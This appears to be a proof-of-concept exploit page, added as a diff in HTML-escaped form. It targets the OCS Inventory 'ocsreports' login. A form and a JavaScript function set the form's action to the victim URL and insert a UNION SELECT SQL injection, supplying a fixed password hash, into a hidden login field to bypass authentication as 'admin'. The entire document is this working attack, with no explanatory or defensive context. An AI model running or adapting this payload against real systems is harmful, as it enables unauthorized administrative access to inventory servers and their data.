@@ -1,0 +1,31 @@
+&lt;script&gt;
+  function inject()
+  {
+    document.getElementById(&#039;log&#039;).action =
+document.getElementById(&#039;ocsreports&#039;).value + &#039;index.php&#039;;
+    sql = &quot;0&#039; UNION SELECT id, accesslvl,
+&#039;a181b4673216ad247a0f78066a9646e1&#039; FROM operators WHERE id=&#039;&quot;
+    document.getElementById(&#039;login&#039;).value = sql +
+document.getElementById(&#039;user&#039;).value;
+    document.getElementById(&#039;pass&#039;).value = &quot;inject&quot;;
+  }
+&lt;/script&gt;
+&lt;form name=&quot;log&quot; id=&quot;log&quot; action=&quot;&quot; method=&quot;post&quot;&gt;
+  &lt;table border=&quot;0&quot; width=&quot;450px&quot;&gt;
+  &lt;tr&gt;
+    &lt;td&gt;&lt;b&gt;OCSReports :&lt;/b&gt;&lt;/td&gt;
+    &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;ocsreports&quot; size=&quot;40&quot;
+value=&quot;http://www.example.com/ocsreports/&quot; /&gt;&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+    &lt;td&gt;&lt;b&gt;Login :&lt;/b&gt;&lt;/td&gt;
+    &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; size=&quot;40&quot; value=&quot;admin&quot; /&gt;&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+    &lt;td&gt;&lt;input type=&quot;hidden&quot; name=&quot;login&quot; id=&quot;login&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;pass&quot;  id=&quot;pass&quot;  /&gt;&lt;/td&gt;
+    &lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;subLogin&quot; onclick=&quot;inject();&quot;&gt;&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;/table&gt;
+&lt;/form&gt;
+
